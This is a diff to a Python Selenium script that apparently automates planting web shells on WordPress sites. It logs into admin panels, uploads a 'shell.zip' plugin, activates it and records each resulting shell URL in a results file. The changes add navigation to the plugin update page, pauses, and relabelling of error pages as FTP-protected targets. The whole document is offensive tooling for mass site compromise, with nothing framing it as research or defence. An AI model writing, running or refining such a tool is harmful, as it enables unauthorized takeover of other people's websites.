@@ -61,9 +61,11 @@ def remindme(url):
             driver.get(link + '/wp-admin/plugin-install.php?tab=upload')
             driver.find_element_by_id("pluginzip").send_keys(r"C:\wpnew\Shell\shell.zip")
             driver.find_element_by_id("install-plugin-submit").click()
+            driver.get(link + '/wp-admin/update.php?action=upload-plugin')
             driver.find_element_by_link_text('Activate Plugin').click()
             open("Result\ShellUpload.txt", "a").write(link + '/wp-content/plugins/wp-check/recheck/func.php' + '\n')
             print(green + "Success Uploading " + link + '/wp-content/plugins/wp-check/recheck/func.php' + whit)
+            time.sleep(20)
             driver.close()
         else:
             print(green + "Success Login " + link + whit)
@@ -75,19 +77,23 @@ def remindme(url):
                 driver.get(link + '/wp-admin/plugin-install.php?tab=upload')
                 driver.find_element_by_id("pluginzip").send_keys(r"C:\wpnew\Shell\shell.zip")
                 driver.find_element_by_id("install-plugin-submit").click()
+                driver.get(link + '/wp-admin/update.php?action=upload-plugin')
                 driver.find_element_by_link_text('Activate Plugin').click()
                 open("Result\Result\ShellUpload.txt", "a").write(link + '/wp-content/plugins/wp-check/recheck/func.php' + '\n')
                 print(green + "Success Uploading " + link + '/wp-content/plugins/wp-check/recheck/func.php' + whit)
+                time.sleep(20)
             except:
                 try:
                     link = str(driver.current_url).split("/wp-admin")[0]
                     driver.get(link + '/wp-admin/plugin-install.php?tab=upload')
                     driver.find_element_by_id("pluginzip").send_keys(r"C:\wpnew\Shell\shell.zip")
                     driver.find_element_by_id("install-plugin-submit").click()
+                    driver.get(link + '/wp-admin/update.php?action=upload-plugin')
                     try:
                         driver.find_element_by_id("error-page")
-                        print(yellow + "Page Error Try Manual " + link )
-                        open("Result\PageError.txt", "a").write(url +'\n')
+                        print(yellow + "Detected FTP, Try Manual " + link )
+                        open("Result\FTP.txt", "a").write(url +'\n')
+                        time.sleep(20)
                         driver.close()
                     except:
                         print(green + "Succes Uploading {0}/wp-content/plugins/wp-check/recheck/func.php".format(
